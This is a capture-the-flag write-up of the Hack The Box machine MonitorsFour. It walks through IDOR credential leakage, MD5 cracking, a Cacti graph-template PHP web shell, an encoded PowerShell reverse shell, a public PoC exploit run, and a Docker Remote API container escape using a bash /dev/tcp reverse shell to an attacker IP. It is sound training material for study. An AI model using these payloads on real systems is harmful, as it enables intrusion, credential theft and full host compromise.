- - - 
created : 07-12-2025 

Tags : #easy 

Released on DD.month.AA (Season x)
- - - 
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/MonitorsFour/user]
└─$ rustscan -a monitorsfour.htb -- -A
Open 10.10.11.98:80
Open 10.10.11.98:5985

PORT     STATE SERVICE REASON          VERSION
80/tcp   open  http    syn-ack ttl 127 nginx
|_http-favicon: Unknown favicon MD5: 889DCABDC39A9126364F6A675AA4167D
|_http-title: MonitorsFour - Networking Solutions
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET
5985/tcp open  http    syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
```
# Enumeration
## HTTP (80)

Visit `/login` page:

![Pasted image 20251207134343.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251207134343.png)
### Dirsearch

We can use [Gobuster](../../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) and [Dirsearch](../../../3%20-%20Tags/Hacking%20Tools/Dirsearch.md) to start [Enumeration](../../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on the target:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/MonitorsFour/user]
└─$ dirsearch -u http://monitorsfour.htb

200 -   97B  - /.env
```

Fuzz endpoints:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/MonitorsFour/user]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt -u  http://monitorsfour.htb 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://monitorsfour.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/api/v1/auth          (Status: 405) [Size: 0]
/api/v1/user          (Status: 200) [Size: 35]
Progress: 269 / 269 (100.00%)
===============================================================
Finished
===============================================================
```

Use [Caido](../../../3%20-%20Tags/Hacking%20Tools/Caido.md) or [BurpSuite](../../../3%20-%20Tags/Hacking%20Tools/BurpSuite.md) or `cURL`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/MonitorsFour/user]
└─$ curl http://monitorsfour.htb/api/v1/user 
{"error":"Missing token parameter"} 
```

The `/user` endpoint accepts a `token` parameter that appears to be a sequential user ID. Testing with `token=0` returns all users in the database:

```js
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/MonitorsFour/user]
└─$ curl -s "http://monitorsfour.htb/user?token=0" | jq
[
  {
    "id": 2,
    "username": "admin",
    "email": "admin@monitorsfour.htb",
    "password": "56b32eb43e6f15395f6c46c1c9e1cd36",
    "role": "super user",
    "token": "845103e96bf01197b2",
    "name": "Marcus Higgins",
    "position": "System Administrator",
    "dob": "1978-04-26",
    "start_date": "2021-01-12",
    "salary": "320800.00"
  },
  {
    "id": 5,
    "username": "mwatson",
    "email": "mwatson@monitorsfour.htb",
    "password": "69196959c16b26ef00b77d82cf6eb169",
    "role": "user",
    "token": "0e543210987654321",
    "name": "Michael Watson",
    "position": "Website Administrator",
    "dob": "1985-02-15",
    "start_date": "2021-05-11",
    "salary": "75000.00"
  },
  {
    "id": 6,
    "username": "janderson",
    "email": "janderson@monitorsfour.htb",
    "password": "2a22dcf99190c322d974c8df5ba3256b",
    "role": "user",
    "token": "0e999999999999999",
    "name": "Jennifer Anderson",
    "position": "Network Engineer",
    "dob": "1990-07-16",
    "start_date": "2021-06-20",
    "salary": "68000.00"
  },
  {
    "id": 7,
    "username": "dthompson",
    "email": "dthompson@monitorsfour.htb",
    "password": "8d4a7e7fd08555133e056d9aacb1e519",
    "role": "user",
    "token": "0e111111111111111",
    "name": "David Thompson",
    "position": "Database Manager",
    "dob": "1982-11-23",
    "start_date": "2022-09-15",
    "salary": "83000.00"
  }
]
```

We have:

```go
admin:56b32eb43e6HTB{REDACTED_HASH}
mwatson:HTB{REDACTED_HASH}
janderson:HTB{REDACTED_HASH}
dthompson: HTB{REDACTED_HASH}
```

This is an [IDOR](../../../3%20-%20Tags/Hacking%20Concepts/IDOR.md) vulnerability, crack the passwords:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/MonitorsFour/user]
└─$ john passwds -w=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 
Using default input encoding: UTF-8
Loaded 4 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=12
Press 'q' or Ctrl-C to abort, almost any other key for status
HTB{REDACTED_PASSWD}     (admin)     
1g 0:00:00:00 DONE (2025-12-07 15:52) 1.369g/s 19648Kp/s 19648Kc/s 58968KC/s  fuckyooh21..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

Visit the page `.env` to download the file and read it:

```go
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=HTB{REDACTED_PASSWD} 
```

We have collected some useful info.
## Fuff

Look for other vhosts or subdomains:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/MonitorsFour/user]
└─$ ffuf -w /usr/share/wordlists/wfuzz/general/megabeast.txt -H 'Host: FUZZ.monitorsfour.htb' -u http://monitorsfour.htb -fs 138 -c 

cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 323ms]
```

We can add it to our `/etc/hosts` and visit the panel:

![Pasted image 20251207143441.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251207143441.png)
# Exploit
## Cacti Panel Access

First we have to use the gathered credentials to access the `monitorsfour_db` (MariaDB) and read it, to do so we have to get access to port `3306`, there are 2 options here:

- It's a port on a different internal machine or network segment.
- It's a port only accessible locally (from the same machine or internal network).

Use the found credentials to login on the **Login** panel: `admin/wonderful1`:

![Pasted image 20251207160116.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251207160116.png)

We find the real admin name **Marcus Higgins** and reuse password on **Cacti** panel:

![Pasted image 20251207160222.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251207160222.png)
## CVE-2025-24367 / Graph Template injection RCE

**Cacti version 1.2.28** addresses several critical vulnerabilities, one of them is **CVE-2025-24367**

Up to version 1.2.28: https://www.cve.news/cve-2025-24367/

Cacti lets users create custom graphs and templates, which involves saving user inputs and generating PHP files. Unfortunately, this design allowed an attacker to inject PHP code via certain fields, causing Cacti to unwittingly write rogue files into its own web directory. Once in place, these files could be accessed via the browser and execute attacker-controlled PHP code.
### PoC
  
Create a new “Graph Template” and inject the following PHP payload into the template title field: 
  
```php
<?php echo shell_exec($_GET['cmd']); ?>
```

When Cacti saves the graph template, this payload ends up inside a newly created PHP file (e.g., _/cacti/scripts/malicious.php_). If you then visit:  
  
```php
http://cacti.monitorsfour/scripts/malicious.php?cmd=whoami
```

You’d see the result of _whoami_ the username under which the web server is running. You can run any other system command by changing the URL parameter, gain a[Reverse Shell](../../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md):

```bash
http://cacti.monitorsfour.htb/scripts/malicious.php?cmd=powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMQAyADYAIgAsADEAMwAzADcAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

Or using the [Github](../../../3%20-%20Tags/Hacking%20Concepts/Github.md) PoC script from the box author:

```bash
# Clone exploit repo
git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.git
cd CVE-2025-24367-Cacti-PoC

# Exploit
└─$ python exploit.py \
    -u marcus -p wonderful1 \
    -url http://cacti.monitorsfour.htb \
    -i 10.10.15.126 -l 1337
[+] Cacti Instance Found!
[+] Serving HTTP on port 80
[+] Login Successful!
[+] Got graph ID: 226
[i] Created PHP filename: apBaX.php
[+] Got payload: /bash
[i] Created PHP filename: 7TMn5.php
[+] Hit timeout, looks good for shell, check your listener!
[+] Stopped HTTP server on port 80
```

Previous opened [Netcat](../../../3%20-%20Tags/Hacking%20Tools/Netcat.md) listener: 

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/MonitorsFour/user]
└─$ nc -lvnp 1337
listening on [any] 1337 ...

www-data@821fbd6a43fa:/home/marcus$ cat user.txt
cat user.txt
   HTB{REDACTED_FLAG}
```

And we have the user flag, perform [Shell Stabilization](../../../3%20-%20Tags/Hacking%20Concepts/Shell%20Stabilization.md):

```bash
www-data@821fbd6a43fa:~/html/cacti$ export TERM=xterm
export TERM=xterm
www-data@821fbd6a43fa:~/html/cacti$ python3 -c 'import pty;pty.spawn("/bin/bash")'
)'thon3 -c 'import pty;pty.spawn("/bin/bash")
bash: python3: command not found
www-data@821fbd6a43fa:~/html/cacti$ ^Z
zsh: suspended  nc -lvp 1337
                                                                                                       
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/MonitorsFour/user/CVE-2025-24367-Cacti-PoC]
└─$ stty raw -echo;fg                    
[1]  + continued  nc -lvp 1337
                        reset
```
# Privilege Escalation

We have to get to the host, first find more info and the right internal IP address to pivot:

```bash
www-data@821fbd6a43fa:/home/marcus$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host proto kernel_lo                                                           
       valid_lft forever preferred_lft forever                                                         
2: eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether e2:f7:cd:72:3e:37 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever
www-data@821fbd6a43fa:/home/marcus$ ip route
ip route
default via 172.18.0.1 dev eth0 
172.18.0.0/16 dev eth0 proto kernel scope link src 172.18.0.2 
www-data@821fbd6a43fa:/home/marcus$ getent hosts mariadb
getent hosts mariadb
172.18.0.3      mariadb

www-data@821fbd6a43fa:/home/marcus$ env
env
HOSTNAME=821fbd6a43fa
PHP_VERSION=8.3.27
PHP_INI_DIR=/usr/local/etc/php
GPG_KEYS=1198C0117593497A5EC5C199286AF1F9897469DC C28D937575603EB4ABB725861C0779DC5C0A9DE4 AFD8691FDAEDF03BDF6E460563F15A9B715376CA
PHP_LDFLAGS=-Wl,-O1 -pie
PWD=/home/marcus
HOME=/var/www
PHP_SHA256=c15a09a9d199437144ecfef7d712ec4ca5c6820cf34acc24cc8489dd0cee41ba
PHPIZE_DEPS=autoconf            dpkg-dev                file            g++             gcc           libc-dev                 make            pkg-config              re2c
PHP_URL=https://www.php.net/distributions/php-8.3.27.tar.xz
USER=www-data
SHLVL=3
PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PHP_ASC_URL=https://www.php.net/distributions/php-8.3.27.tar.xz.asc
PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
OLDPWD=/var/www
_=/usr/bin/env

www-data@821fbd6a43fa:/$ cd /etc 
cd /etc
www-data@821fbd6a43fa:/etc$ cat resolv.conf
cat resolv.conf
# Generated by Docker Engine.
# This file can be edited; Docker Engine will not make further changes once it
# has been modified.

nameserver 127.0.0.11
options ndots:0

# Based on host file: '/etc/resolv.conf' (internal resolver)
# ExtServers: [host(192.168.65.7)]
# Overrides: []
# Option ndots from: internal
```

`mariadb` is a Docker-internal service and we're inside a Docker container, bridged under WSL2, which is hosted on the Windows target, find the port `2375` is the Docker Remote API over HTTP:

https://blog.qwertysecurity.com/Articles/blog3
## CVE-2025-9074

Enumerate local Docker images:

```js
{
  "Containers": 1,
  "Created": 1762794130,
  "Id": "sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666",
  "Labels": {
    "com.docker.compose.project": "docker_setup",
    "com.docker.compose.service": "nginx-php",
    "com.docker.compose.version": "2.39.1"
  },
  "ParentId": "",
  "Descriptor": {
    "mediaType": "application/vnd.oci.image.index.v1+json",
    "digest": "sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666",
    "size": 856
  },
  "RepoDigests": [
    "docker_setup-nginx-php@sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666"
  ],
  "RepoTags": [
    "docker_setup-nginx-php:latest"
  ],
  "SharedSize": -1,
  "Size": 1277167255
}
{
  "Containers": 1,
  "Created": 1762791053,
  "Id": "sha256:74ffe0cfb45116e41fb302d0f680e014bf028ab2308ada6446931db8f55dfd40",
  "Labels": {
    "com.docker.compose.project": "docker_setup",
    "com.docker.compose.service": "mariadb",
    "com.docker.compose.version": "2.39.1",
    "org.opencontainers.image.authors": "MariaDB Community",
    "org.opencontainers.image.base.name": "docker.io/library/ubuntu:noble",
    "org.opencontainers.image.description": "MariaDB Database for relational SQL",
    "org.opencontainers.image.documentation": "https://hub.docker.com/_/mariadb/",
    "org.opencontainers.image.licenses": "GPL-2.0",
    "org.opencontainers.image.ref.name": "ubuntu",
    "org.opencontainers.image.source": "https://github.com/MariaDB/mariadb-docker",
    "org.opencontainers.image.title": "MariaDB Database",
    "org.opencontainers.image.url": "https://github.com/MariaDB/mariadb-docker",
    "org.opencontainers.image.vendor": "MariaDB Community",
    "org.opencontainers.image.version": "11.4.8"
  },
  "ParentId": "",
  "Descriptor": {
    "mediaType": "application/vnd.oci.image.index.v1+json",
    "digest": "sha256:74ffe0cfb45116e41fb302d0f680e014bf028ab2308ada6446931db8f55dfd40",
    "size": 856
  },
  "RepoDigests": [
    "docker_setup-mariadb@sha256:74ffe0cfb45116e41fb302d0f680e014bf028ab2308ada6446931db8f55dfd40"
  ],
  "RepoTags": [
    "docker_setup-mariadb:latest"
  ],
  "SharedSize": -1,
  "Size": 454269972
}
{
  "Containers": 1,
  "Created": 1759921496,
  "Id": "sha256:4b7ce07002c69e8f3d704a9c5d6fd3053be500b7f1c69fc0d80990c2ad8dd412",
  "Labels": null,
  "ParentId": "",
  "Descriptor": {
    "mediaType": "application/vnd.oci.image.index.v1+json",
    "digest": "sha256:4b7ce07002c69e8f3d704a9c5d6fd3053be500b7f1c69fc0d80990c2ad8dd412",
    "size": 9218
  },
  "RepoDigests": [
    "alpine@sha256:4b7ce07002c69e8f3d704a9c5d6fd3053be500b7f1c69fc0d80990c2ad8dd412"
  ],
  "RepoTags": [
    "alpine:latest"
  ],
  "SharedSize": -1,
  "Size": 12794775
}
```

We can use the PHP image, create a host-mounted container:

```bash
cd /tmp
# mounting the host's C: drive under /host_root
curl -H 'Content-Type: application/json' \
  -d '{
    "Image": "docker_setup-nginx-php:latest",
    "Cmd": ["/bin/bash","-c","bash -i >& /dev/tcp/10.10.15.126/4444 0>&1"],
    "HostConfig": {
      "Binds": ["/mnt/host/c:/host_root"]
    }
  }' \
  -o create.json \
  http://192.168.65.7:2375/containers/create
```

Retrieve the container ID:

```go
cid=$(grep -o '"Id":"[^"]*"' create.json | cut -d'"' -f4)
```

Then run it:

```bash
curl -d '' "http://192.168.65.7:2375/containers/$cid/start"
```

Check listener:

```bash
root@e019f8118412:/host_root/Users/Administrator/Desktop# cat root.txt
cat root.txt
   HTB{REDACTED_FLAG}
```

Pwned !!